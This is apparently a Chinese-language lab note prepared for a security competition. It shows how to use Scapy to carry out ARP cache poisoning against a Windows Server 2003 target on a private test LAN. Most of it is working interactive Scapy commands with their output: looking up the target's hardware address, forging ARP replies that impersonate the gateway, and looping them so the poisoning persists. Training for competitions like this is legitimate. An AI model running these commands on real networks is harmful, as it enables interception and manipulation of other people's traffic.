### 使用Scapy对ARP协议缺陷进行利用



本篇笔记是对省赛的笔记[scapy.md](<https://github.com/leaf-lxh/note/blob/master/%E7%9C%81%E8%B5%9B/%E7%9F%A5%E8%AF%86%E5%82%A8%E5%A4%87/scapy.md>)的补充说明，另外针对国赛使用的环境，使用python3



#### 安装

```
$ sudo python3 -m pip install scapy
```

#### 场景

| 角色                      | 网卡接口 | IP地址         | 硬件地址          | 网关地址      |
| ------------------------- | -------- | -------------- | ----------------- | ------------- |
| 攻击机-Ubuntu18.04        | ens33    | 192.168.247.24 | 00:0c:29:a7:3b:4d | 无            |
| 靶机A-Windows Server 2003 | 本地连接 | 192.168.247.16 | 00:0C:29:4A:25:26 | 192.168.247.2 |
| 局域网网关                | 无       | 192.168.247.2  | 00:50:56:fe:55:fe | 无            |


#### 手工利用
```
#创建raw_socket需要root权限
$ sudo scapy
#设定使用的网络接口
>>> conf.iface="ens33"
=============================================================================
#目的：查询靶机A的硬件地址
#使用sr1函数，发送一个数据包，接收一个数据包
#使用ARP类构造ARP数据包，操作码op指定为1或"who-has"，目标IP地址pdst指定为靶机IP地址
#其他的选项会自动根据环境填充：本机ip地址，本机硬件地址
#sr1函数返回靶机响应的ARP数据包，数据包中的hwsrc为靶机的硬件地址
>>> sr1(ARP(op=1, pdst="192.168.247.16")).hwsrc
Begin emission:
*Finished sending 1 packets.

Received 1 packets, got 1 answers, remaining 0 packets
'00:0c:29:4a:25:26'
=============================================================================
#目的：查询当前使用的网卡的硬件地址
>>> ARP().hwsrc
'00:0c:29:a7:3b:4d'
=============================================================================
#目的：告知靶机A，网关的硬件地址为攻击机的硬件地址
#使用send函数，发送数据包，不接收返回数据包
#使用ARP类构造ARP数据包，操作码op指定为2，指定源IP地址为网关地址，指定目标IP地址为靶机
#其他的选项会根据环境进行自动填充：本机硬件地址
>>> send(ARP(op=2, psrc="192.168.247.2", pdst="192.168.247.16"))
.
Sent 1 packets.
=============================================================================
#目的：基于上题的目的，改为循环发送ARP数据包，保持靶机被毒化状态
#使用srloop函数循环发送数据包
#由于主机接收到ARP响应报文后不会回应，所以这个函数接收不到数据包，所以会是fail
#实验时发现win server 2003接收到arp响应报文后，只有当arp表中有相应的IP项，才会根据报文进行更新
#如果没有对应的IP项，不会根据响应报文创建IP-MAC映射关系
>>> srloop(ARP(op=2, psrc="192.168.247.2", pdst="192.168.247.16"))
fail 1: ARP is at 00:0c:29:a7:3b:4d says 192.168.247.2
fail 1: ARP is at 00:0c:29:a7:3b:4d says 192.168.247.2
fail 1: ARP is at 00:0c:29:a7:3b:4d says 192.168.247.2
fail 1: ARP is at 00:0c:29:a7:3b:4d says 192.168.247.2


```

